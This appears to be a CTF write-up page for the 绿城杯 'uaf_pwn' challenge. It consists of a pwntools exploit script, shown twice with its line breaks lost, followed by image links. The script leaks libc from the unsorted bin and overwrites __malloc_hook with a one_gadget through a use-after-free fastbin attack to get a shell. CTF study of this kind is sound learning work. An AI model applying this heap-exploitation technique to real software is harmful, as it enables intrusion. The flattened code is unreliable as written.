# 漏洞学习之PWN-绿城杯uaf_pwn 分析

> 原文: https://www.ctfiot.com/89346.html
> ID: 89346

Pythonfrom pwn import *import pdb# -*- coding: utf-8 -*- 

debug = 1if (debug): p = process("./uaf_pwn")else: p = remote('node4.buuoj.cn', 25403)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def malloc(size): p.recvuntil(">") p.sendline("1") p.recvuntil("size>") p.sendline(str(size)) 

def free(idx): # p.recvuntil(">") p.sendline("2") p.recvuntil("index>") p.sendline(str(idx))

def fill(idx,payload): p.recvuntil(">") p.sendline("3") p.recvuntil("index>") p.sendline(str(idx)) p.recvuntil("content>") p.send(payload)

def show(idx): p.recvuntil(">") p.sendline("4") p.recvuntil("index>") p.sendline(str(idx)) return p.recv()[:-1]

malloc(0x100) # idx 0 use unsorted_bin get main_arena offsetmalloc(0x60) # idx 1free(0)leakaddr = show(0)# leak <main_arena + 88>libc_base = u64(leakaddr+b'x00'+b'x00') - 0x3c4b78

print(hex(libc_base))

malloc_hook = libc.symbols['__malloc_hook'] +libc_baseone_gadget = libc_base + 0x4527afree(1) #idx 1

fill(1,p64(malloc_hook-0x23)) # chunk1_fd = malloc_hookmalloc(0x60) # idx 2 get idx_1's chunkmalloc(0x60) # idx 3fill(3,b'a'*0x13+p64(one_gadget))

malloc(0x10)

p.interactive()


```
Pythonfrom pwn import *import pdb# -*- coding: utf-8 -*- 

debug = 1if (debug): p = process("./uaf_pwn")else: p = remote('node4.buuoj.cn', 25403)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def malloc(size): p.recvuntil(">") p.sendline("1") p.recvuntil("size>") p.sendline(str(size)) 

def free(idx): # p.recvuntil(">") p.sendline("2") p.recvuntil("index>") p.sendline(str(idx))

def fill(idx,payload): p.recvuntil(">") p.sendline("3") p.recvuntil("index>") p.sendline(str(idx)) p.recvuntil("content>") p.send(payload)

def show(idx): p.recvuntil(">") p.sendline("4") p.recvuntil("index>") p.sendline(str(idx)) return p.recv()[:-1]

malloc(0x100) # idx 0 use unsorted_bin get main_arena offsetmalloc(0x60) # idx 1free(0)leakaddr = show(0)# leak <main_arena + 88>libc_base = u64(leakaddr+b'x00'+b'x00') - 0x3c4b78

print(hex(libc_base))

malloc_hook = libc.symbols['__malloc_hook'] +libc_baseone_gadget = libc_base + 0x4527afree(1) #idx 1

fill(1,p64(malloc_hook-0x23)) # chunk1_fd = malloc_hookmalloc(0x60) # idx 2 get idx_1's chunkmalloc(0x60) # idx 3fill(3,b'a'*0x13+p64(one_gadget))

malloc(0x10)

p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1672539851.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1672539852.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1672539853.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/5-1672539854.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/0-1672539854.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1672539856.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/7-1672539858.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/10-1672539858.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1672539860.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/1-1672539872.png)